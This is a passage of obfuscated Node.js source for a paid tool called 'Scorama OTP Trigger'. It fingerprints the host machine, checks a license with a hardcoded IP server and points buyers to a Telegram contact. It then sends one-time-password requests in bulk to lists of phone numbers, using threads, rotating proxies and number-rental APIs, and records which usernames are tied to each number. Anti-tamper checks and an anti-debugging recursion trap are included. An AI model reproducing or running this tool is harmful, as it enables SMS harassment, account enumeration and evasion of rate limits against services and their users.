          if (v433) v424.push('H:' + v433[0x1].trim());
        }
      } catch (v434) {}
      try {
        if (fs.existsSync("/etc/machine-id")) {
          const v435 = fs.readFileSync("/etc/machine-id", "utf8").trim();
          if (v435) v424.push('M:' + v435);
        }
      } catch (v436) {}
      try {
        const v437 = v419.cpus(),
          v438 = v437 && v437.length > 0x0 ? v437[0x0].model : "UnknownCPU",
          v439 = v419.totalmem(),
          v440 = v419.release(),
          v441 = v419.hostname();
        v424.push('F:' + v438 + '|' + v439 + '|' + v440 + '|' + v441);
      } catch (v442) {}
      const v425 = v424.join('||'),
        v426 = crypto.createHash("sha256").update(v425).digest("hex").toUpperCase(),
        v427 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
      return v427 + v426.substring(0x0, 0x8) + '-' + v426.substring(0x8, 0xc) + '-' + v426.substring(0xc, 0x10);
    }
  } catch (v443) {
    return '';
  }
}
function verifyServerSignature(v444, v445) {
  if (!v445) return false;
  try {
    return crypto.verify(null, Buffer.from(v444, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v445, "base64"));
  } catch (v446) {
    return false;
  }
}
async function start() {
  const v447 = generateHWID();
  !v447 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows or Android.\n")), process.exit(0x1));
  const v448 = generateHWID();
  v448 !== v447 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(0x1));
  printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Scorama OTP Trigger          ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v447.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
  let v449 = false;
  const v450 = Date.now();
  try {
    const v476 = await new Promise((v477, v478) => {
      const v479 = {};
      v479.hwid = v447;
      v479.app_id = "scorama";
      v479.version = "1.0.0", v479.timestamp = v450;
      const v480 = JSON.stringify(v479);
      const v481 = {
          'hostname': "188.137.176.163",
          'port': 0xec1,
          'path': "/api/verify",
          'method': "POST",
          'headers': {
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v480)
          },
          'timeout': 0x2710
        },
        v482 = http.request(v481, v483 => {
          let v484 = '';
          v483.on("data", v485 => v484 += v485), v483.on("end", () => {
            try {
              v477(JSON.parse(v484));
            } catch (v486) {
              v478(v486);
            }
          });
        });
      v482.on("error", v478);
      v482.on("timeout", function () {
        this.destroy(), v478(new Error("Timeout"));
      }), v482.write(v480), v482.end();
    });
    if (v476) {
      v476.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
      if (v476.status === "banned" || v476.status === "expired" || !v476.sig) {
        await new Promise(v490 => setTimeout(v490, 0x5dc));
        let v489 = String(v476.reason || "NOT REGISTERED");
        if (!v476.reason && !v476.sig) v489 = "NOT REGISTERED / REMOVED";
        console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — SCORAMA TOOL    ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v447.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v489.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
      }
      const v487 = v447 + "|scorama|1.0.0|" + v450;
      !verifyServerSignature(v487, v476.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
      v449 = true;
      let v488 = v476.token;
      v488 && setInterval(() => {
        if (!v488) return;
        const v491 = {};
        v491.hwid = v447, v491.app_id = "scorama", v491.token = v488;
        const v492 = JSON.stringify(v491),
          v493 = {
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/ping",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v492)
            },
            'timeout': 0x1388
          },
          v494 = http.request(v493, v495 => {
            let v496 = '';
            v495.on("data", v497 => v496 += v497), v495.on("end", () => {
              try {
                const v498 = JSON.parse(v496);
                if (v498.status === 'ok' && v498.token) v488 = v498.token;
              } catch (v499) {}
            });
          });
        v494.on("error", () => {}), v494.on("timeout", function () {
          this.destroy();
        }), v494.write(v492);
        v494.end();
      }, 0xafc8);
    }
  } catch (v500) {
    console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(0x1);
  }
  !v449 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
  let v451 = process.argv.slice(0x2),
    v452 = null,
    v453 = null,
    v454 = null;
  let v455 = null,
    v456 = null,
    v457 = 0x2;
  if (v451.length === 0x0) {
    const v501 = await interactiveWizard();
    v451 = [v501.numbersFile, v501.threads, v501.proxiesFile], v456 = v501.singleNumber || null, v452 = v501.nexaConfig || null, v453 = v501.twoOoConfig || null, v454 = v501.smsBowerConfig || null, v455 = v501.zenexConfig || null, v457 = v501.retries !== undefined ? v501.retries : 0x2;
  }
  let v458 = path.resolve(v451[0x0] || "numbers.txt");
  let v459 = parseInt(v451[0x1]) || 0xa,
    v460 = v451[0x2] !== undefined ? v451[0x2] : "proxies.txt";
  if (v460.toLowerCase() === "none") v460 = '';
  const v461 = generateHWID();
  v461 !== v447 && (console.error(R("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), process.exit(0x1));
  printHeader(), console.log(B("  ✓ License: Licensed") + G(" | HWID: " + v447));
  let v462 = [];
  if (v456) v462 = [v456];else !v452 && !v453 && !v454 && !v455 && (!fs.existsSync(v458) && (console.error(R("✗ Error: Numbers file not found: " + v458)), process.exit(0x1)), v462 = fs.readFileSync(v458, "utf8").split(/\r?\n/).map(v502 => v502.trim()).filter(v503 => v503.length > 0x5 && !v503.startsWith('#')));
  let v463 = [];
  v460 && fs.existsSync(v460) && (v463 = fs.readFileSync(v460, "utf8").split(/\r?\n/).map(v504 => v504.trim()).filter(v505 => v505.length > 0x0 && !v505.startsWith('#')));
  let v464 = v463.map(parseProxy).filter(Boolean);
  setupOut(v456 || (v462.length > 0x0 ? v462[0x0] : ''));
  const v465 = v452 || v453 || v454 || v455;
  if (v465) {
    const v506 = v452 ? "NexaOTP" : v453 ? v453.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v454 ? "📱 SMS Bower" : "⚡ Zenex";
    console.log(C("✓ Target  : " + v506 + " API (" + v465.totalCount + " numbers)"));
  } else console.log(C("✓ Loaded " + v462.length + " targets"));
  if (v464.length === 0x0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v464.length));
  console.log(C("✓ Threads : " + v459)), console.log(G("✓ Output  : " + OUT_DIR + '\x0a'));
  try {
    fs.writeFileSync(SUCCESSFUL_FILE, '');
  } catch (v507) {}
  try {
    fs.writeFileSync(FAILED_FILE, '');
  } catch (v508) {}
  try {
    fs.writeFileSync(DEBUG_FILE, "=== SCORAMA DEBUG SESSION " + new Date().toISOString() + " ===\n");
  } catch (v509) {}
  const v466 = new Dashboard(v465 ? v465.totalCount : v462.length);
  let v467 = [],
    v468 = [],
    v469 = 0x0,
    v470 = false;
  if (v452 || v453) {
    (async () => {
      let v510 = 0x0;
      let v511 = '';
      try {
        for (let v512 = 0x0; v512 < v465.totalCount; v512++) {
          try {
            const v513 = v465.ranges[Math.floor(Math.random() * v465.ranges.length)];
            let v514;
            v452 ? v514 = await nexaLimiter.enqueue(() => nexaFetchNumber(v452.apiKey, v513, v452.serverEndpoint)) : v514 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v453.apiKey, v513, v453.getPath));
            if (v514) {
              v469++, v510 = 0x0;
              if (v468.length > 0x0) v468.shift()(v514);else v467.push(v514);
            }
          } catch (v515) {
            v511 = v515.message;
            if (v515.message.includes("Insufficient balance")) break;
            if (v515.message.includes("No numbers available")) continue;
            v510++;
            if (v510 >= 0x5 && v469 === 0x0) break;
          }
        }
      } finally {
        v470 = true;
        while (v468.length > 0x0) v468.shift()(null);
      }
    })();
  } else {
    if (v454) {
      const v516 = v454;
      (async () => {
        let v517 = 0x0;
        try {
          for (let v518 = 0x0; v518 < v516.totalCount; v518++) {
            try {
              const {
                phoneNumber: v519
              } = await smsBowerFetchNumber(v516.apiKey, v516.service, v516.country, v516.maxPrice);
              v469++, v517 = 0x0;
              if (v468.length > 0x0) v468.shift()(v519);else v467.push(v519);
            } catch (v520) {
              v517++;
              if (v517 >= 0x5 && v469 === 0x0) break;
              await new Promise(v521 => setTimeout(v521, 0x7d0));
            }
          }
        } finally {
          v470 = true;
          while (v468.length > 0x0) v468.shift()(null);
        }
      })();
    } else {
      if (v455) {
        const v522 = v455;
        (async () => {
          let v523 = 0x0;
          try {
            for (let v524 = 0x0; v524 < v522.totalCount; v524++) {
              try {
                const v525 = v522.ranges[Math.floor(Math.random() * v522.ranges.length)],
                  v526 = await zenexFetchNumber(v522.apiKey, v525);
                v469++, v523 = 0x0;
                if (v468.length > 0x0) v468.shift()(v526);else v467.push(v526);
              } catch (v527) {
                v523++;
                if (v523 >= 0x5 && v469 === 0x0) break;
                await new Promise(v528 => setTimeout(v528, 0x7d0));
              }
            }
          } finally {
            v470 = true;
            while (v468.length > 0x0) v468.shift()(null);
          }
        })();
      }
    }
  }
  const v471 = !!(v452 || v453 || v454 || v455),
    v472 = v471 ? () => {
      if (v467.length > 0x0) return Promise.resolve(v467.shift());
      if (v470) return Promise.resolve(null);
      return new Promise(v529 => v468.push(v529));
    } : () => {
      if (v462.length === 0x0) return Promise.resolve(null);
      const v530 = Math.floor(Math.random() * v462.length);
      return Promise.resolve(v462.splice(v530, 0x1)[0x0]);
    };
  const fn7 = () => {
    if (v464.length === 0x0) return null;
    const v531 = v464[Math.floor(Math.random() * v464.length)];
    return rotateSessionId(v531);
  };
  function fn8(v532) {
    try {
      if (v471 || v456) return;
      const v533 = fs.readFileSync(v458, "utf8"),
        v534 = v533.split(/\r?\n/).filter(v535 => v535.trim() !== v532.trim()).join('\x0a');
      fs.writeFileSync(v458, v534);
    } catch (v536) {}
  }
  const v473 = v471 ? Math.min(v459, v465.totalCount) : Math.min(v459, v462.length),
    v474 = [],
    v475 = setInterval(() => v466.render(), 0x1f4);
  async function fn9(v537) {
    while (true) {
      const v538 = await v472();
      if (!v538) break;
      try {
        const v539 = await triggerOTP(v538, {
          'onStatus': v540 => v466.setStatus("Worker " + v537 + ':\x20' + v540),
          'proxy': fn7(),
          'workerId': v537,
          'retries': v457
        });
        if (v539.success) {
          {
            v466.successful++;
            v466.processed++;
            fn8(v538);
            fs.appendFileSync(SUCCESSFUL_FILE, v539.phone + "|OTP_SENT|" + (v539.username || '') + '\x0a');
            v466.addLog("Triggered OTP for " + v539.phone + '\x20(' + v539.username + ')', "success");
          }
        } else v466.failed++, v466.processed++, fs.appendFileSync(FAILED_FILE, v539.phone + '|' + v539.message + '\x0a'), v466.addLog("Failed on " + v539.phone + ':\x20' + v539.message, "error");
      } catch (v541) {
        v466.failed++, v466.processed++, v466.addLog("Fatal error on " + v538 + ':\x20' + v541.message, "error");
      }
    }
  }
  for (let v542 = 0x0; v542 < v473; v542++) v474.push(fn9(v542));
  await Promise.all(v474), clearInterval(v475), v466.render(), v466.stop();
}
isMainThread && start().catch(v543 => {
  console.error(R("Fatal error: " + v543.message));
  process.exit(0x1);
});
function fn2(v544) {
  function fn10(v545) {
    fn10(++v545);
  }
  try {
    if (v544) return fn10;else fn10(0x0);
  } catch (v546) {}
}